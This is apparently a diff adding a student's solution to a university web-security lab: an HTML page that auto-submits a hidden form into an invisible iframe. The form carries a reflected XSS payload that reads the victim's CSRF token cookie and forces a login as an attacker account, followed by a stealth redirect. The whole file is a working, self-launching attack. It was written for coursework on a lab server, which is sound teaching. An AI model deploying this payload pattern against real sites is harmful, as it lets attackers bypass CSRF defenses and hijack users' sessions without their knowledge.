@@ -1,0 +1,44 @@
+<html>
+    <body>
+        <!-- Stealthy IFrame (leave here) -->
+        <iframe name="BlankPage" style="visibility:hidden;"></iframe>
+
+        <!-- Update any "..." fields accordingly! -->
+        <form action="http://cs4440.eng.utah.edu/project3/search?csrfdefense=1&xssdefense=0/"
+              target="BlankPage"
+              name="EvilPayload"
+              method="GET">
+
+            <input name="csrfdefense" value="1" type="text">
+            <input name="xssdefense" value="0" type="text">
+            <input name="username" value="attacker" type="text"/>
+            <input name="password" value="l33th4x" type="password"/>
+
+            <!----------------------------
+            | Your attack code goes here!
+            Build referenced from https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie 
+            ----------------------------->
+           <input name="q" value="<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js'></script><script>let aC = document.cookie;let mC = aC.split('; ').find((row) => row.startsWith('csrf_token='));let value = mC?.split('=')[1];jQuery.post('http://cs4440.eng.utah.edu/project3/login', {csrf_token: value,username:'attacker', password:'l33th4x'});</script>" type="text"/>
+           
+            
+            <style>
+            form{
+            visibility: hidden;
+            }
+            </style>
+            
+        </form>
+
+        <!-- Launch the attack! -->
+        <script>
+            document.EvilPayload.submit();
+            //alert('Moving to Login');
+            //document.EvilPayloadLogin.submit();
+            
+        </script>
+
+        <!-- Stealty redirect (leave here) -->
+        <meta http-equiv="refresh" content="1; URL=http://cs4440.eng.utah.edu/project3" />
+        <!---->
+    </body>
+</html>
